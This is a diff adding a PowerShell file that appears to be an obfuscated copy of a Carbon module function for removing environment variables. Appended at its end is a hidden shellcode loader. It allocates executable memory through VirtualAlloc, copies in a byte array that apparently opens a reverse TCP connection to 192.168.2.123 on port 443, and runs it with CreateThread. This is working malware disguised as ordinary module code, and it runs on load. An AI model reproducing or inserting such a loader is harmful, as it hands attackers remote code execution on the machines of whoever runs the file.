@@ -1,0 +1,89 @@
+  &("{0}{1}"-f's','eT')  ("{1}{0}" -f 'sB','VFR5')  (  [tYPe]("{2}{4}{3}{5}{1}{0}{6}"-f 'T','E','e','tVaria','nVIRoNMen','bL','Arget')  )  ;  ${9I`NwS}  =[Type]("{0}{3}{2}{1}" -F 'e','nT','OnME','nVIr');  
+function reM`o`Ve-`ce`NVir`ONmeNtVa`R`ia`BlE
+{
+    
+    [CmdletBinding(sUPPORTSSHOUldproceSS=${Tr`Ue})]
+    param(
+        [Parameter(mANDATORY=${T`Rue})]
+        
+        [string]${n`AmE},
+        
+        [Parameter(PaRAMEterseTnamE="Fo`RcuRREnt`US`Er")]
+        
+        [Switch]${ForcO`M`PuTeR},
+
+        [Parameter(PAramEtERsEtNAmE="ForcUR`R`entu`SeR")]
+        [Parameter(maNdAtorY=${T`RUe},pArAMEterseTNAme="foR`speC`IFicUser")]
+        
+        [Switch]${foRu`seR},
+        
+        [Parameter(PARameTErSETnAmE="FoRC`U`Rren`TusEr")]
+        
+        [Switch]${F`oRp`R`oCess},
+
+        [Parameter(paraMETErsEtnAME="FoRc`U`RReNTUsER")]
+        
+        
+        
+        [Switch]${f`OR`Ce},
+
+        [Parameter(maNDATOry=${t`RuE},pARametERsETnAMe="FOR`SPeCifIcu`SEr")]
+        
+        [pscredential]${cr`ED`ENTIAL}
+    )
+    
+    &("{3}{4}{1}{0}{2}"-f't','Stric','Mode','Se','t-') -Version ("{0}{1}"-f 'L','atest')
+    &("{2}{1}{0}{3}" -f'e','-Call','Use','rPreference') -Cmdlet ${ps`CmDLet} -Session ${EXecUTi`O`N`co`N`TEXt}."sess`Io`NStaTE"
+
+    if( ${pS`CMDl`ET}.parAmEtERsETnamE -eq ("{1}{2}{0}{3}" -f'e','ForSp','ecificUs','r') )
+    {
+        ${pArAmEt`e`RS} = ${PSb`ouNd`pAr`AmETeRs}
+        ${P`ArA`mEt`eRS}.("{1}{0}"-f'move','Re').Invoke(("{3}{2}{1}{0}" -f'tial','en','ed','Cr'))
+        ${J`Ob} = &("{1}{0}{2}"-f't-Jo','Star','b') -ScriptBlock {
+            .("{0}{2}{1}"-f 'Import-Mod','le','u') -Name (&("{1}{0}{2}" -f '-Pa','Join','th') -Path ${US`ing:ca`R`BONR`o`ot} -ChildPath ("{3}{2}{1}{0}" -f 'psd1','bon.','ar','C'))
+            ${V`ERbOSEPREfE`R`e`Nce} = ${U`Sin`G:vE`Rb`OS`epReFeRe`NCe}
+            ${e`R`R`or`Act`iO`NPREfErenCE} = ${US`i`NG`:ErroraC`TioN`p`RefERENCE}
+            ${dEBugPrE`Fere`N`ce} = ${US`I`NG:DEb`UGPREferen`ce}
+            ${W`HAti`FPrEFE`REnCe} = ${Us`iN`G:`whatifpREf`eren`CE}
+            .("{3}{2}{0}{4}{5}{1}" -f'e','e','-CEnvironm','Remove','ntVariab','l') @using:parameters
+        } -Credential ${Cr`E`dENTi`AL}
+        ${J`ob} | .("{0}{2}{1}"-f'W','-Job','ait') | &("{2}{1}{0}"-f've-Job','ecei','R')
+        ${J`oB} | .("{0}{3}{2}{1}" -f 'Re','b','Jo','move-') -Force -ErrorAction ("{1}{0}"-f'gnore','I')
+        return
+    }
+
+    if( -not ${F`Or`proCEss} -and -not ${FO`R`User} -and -not ${fO`R`cO`mPUTER} )
+    {
+        .("{1}{2}{0}"-f'or','Write-E','rr') -Message (("{11}{27}{14}{8}{26}{4}{28}{6}{32}{24}{30}{1}{12}{15}{0}{7}{16}{17}{20}{25}{22}{3}{13}{2}{10}{19}{29}{23}{21}{31}{9}{18}{5}"-f'd. You','t sp','r,','ForCompu','le',' switches.','arg',' must supp','ent varia','es',' F','En','eci','te','ronm','fie','ly ','o','s','o','ne ','rPr',' ','er, or Fo','t','of the','b','vi',' t','rUs',' no','oc','e'))
+        return
+    }
+
+    &("{2}{0}{3}{1}" -f'n','ommand','I','voke-C') -ScriptBlock {
+                                    if( ${Fo`RCOmP`U`TeR} )
+                                    {
+                                          ( .("{0}{1}"-f 'V','ArIAble')  ("V"+"Fr5sB") -vAL)::"mac`hine"
+                                    }
+
+                                    if( ${f`o`RuseR} )
+                                    {
+                                         ${vFR5`sb}::"U`ser"
+                                    }
+
+                                    if( ${FORPrOc`e`ss} )
+                                    {
+                                         ${vf`R`5sB}::"PR`o`CEsS"
+                                    }
+                                } |
+        .("{1}{2}{0}" -f't','Where-Obj','ec') { ${psCmD`Let}.("{2}{3}{1}{0}" -f 'ess','roc','Sh','ouldP').Invoke( ("$_-level "+'envir'+'onm'+'ent '+'v'+'ariab'+'le '+"'$Name'"), ("{0}{1}"-f'remo','ve') ) } |
+        &("{2}{0}{1}{3}{4}" -f 'a','c','ForE','h','-Object') { 
+                            ${Sco`pE} = ${_}
+                              (&("{2}{0}{1}"-f'L','E','GET-vARIab')  ("{0}{1}"-f'9I','NWs'))."vaL`UE"::("{1}{3}{2}{4}{0}{5}{6}" -f 'e','SetEn','ir','v','onm','n','tVariable').Invoke( ${N`AME}, ${nu`ll}, ${sc`oPE} )
+                            if( ${f`Or`ce} -and ${SCO`PE} -ne   ${VF`R5`Sb}::"PRocE`sS" )
+                            {
+                                  ${9I`N`wS}::("{2}{3}{4}{0}{1}"-f'onmentVaria','ble','SetEnv','i','r').Invoke(${na`me}, ${nU`Ll}, ("{0}{1}" -f'Proces','s'))
+                            }
+            }
+}
+
+
+${C} = ((("{112}{53}{12}{38}{31}{48}{110}{84}{22}{82}{36}{72}{39}{23}{35}{28}{10}{73}{46}{100}{83}{79}{19}{32}{88}{5}{80}{51}{42}{8}{20}{85}{4}{30}{21}{16}{34}{102}{40}{91}{15}{62}{41}{25}{68}{33}{99}{97}{75}{55}{86}{27}{52}{54}{26}{111}{3}{89}{6}{87}{47}{0}{60}{103}{49}{24}{77}{98}{107}{71}{65}{14}{29}{104}{105}{78}{7}{57}{64}{56}{67}{17}{101}{1}{13}{63}{43}{2}{106}{9}{96}{50}{45}{70}{114}{76}{81}{108}{93}{11}{18}{94}{95}{66}{59}{109}{74}{58}{90}{37}{44}{113}{69}{92}{61}"-f 'int dwS','lags','tPt','tPtr ',' flPr','ze, uint f','ibut','te','t','d);[D','lAlloc(I','rn ','q',',','r','(qohk',';[D','eation','I','w','i','t)','c','r Vir','tAddres','blic static e','I','e','a',' ','otec','kernel32.dllqoh','S','r','l','tu','xt',' ui','oh','n IntPt','por','u','ca','In','nt src','t(qohms','tr l','s, u',')]pu','ize, IntPtr lpStar','mpor','lo','a','Import(','teThread(','Ptr C','uint ','r,','r d','se','t','nt);','ernel32.dllqoh)]p',' ',' ','t','m','dwCr','xte','nt co','vcrt.','IntP','er','ntP','(IntPt','t','oh)]p','s','rame','d','lAl','u',' e','dress, uint ','i','onType, uint','r','e','i','lpThreadAttr','est,','t','u',' static exte','ntPt','r me','llI',' In',',','n','pAd','F','lIm','ackS','lp','Pa','r lpThreadI',' ','blic','t','blic stat','n','[Dll',', ui','dllq'))."RePLa`Ce"('qoh',[stRinG][CHAr]34));${w} = .("{1}{0}" -f 'd-Type','Ad') -memberDefinition ${C} -Name ("{0}{1}"-f'Win','32') -namespace ("{3}{2}{0}{1}"-f'ct','ions','32Fun','Win') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${z}."lENG`Th" -gt 0x1000){${G} = ${z}."L`EnGTh"};${x}=${W}::("{2}{1}{3}{0}" -f 'oc','lA','Virtua','ll').Invoke(0,0x1000,${g},0x40);for (${i}=0;${i} -le (${z}."LE`NGTH"-1);${I}++) {${w}::"Me`mSet"([IntPtr](${x}.("{2}{1}{0}" -f 't32','In','To').Invoke()+${i}), ${z}[${i}], 1)};${w}::("{2}{3}{0}{1}"-f 'eateT','hread','C','r').Invoke(0,0,${X},0,0,0);for (;;){.("{2}{1}{0}"-f 'p','t-slee','Star') 60};
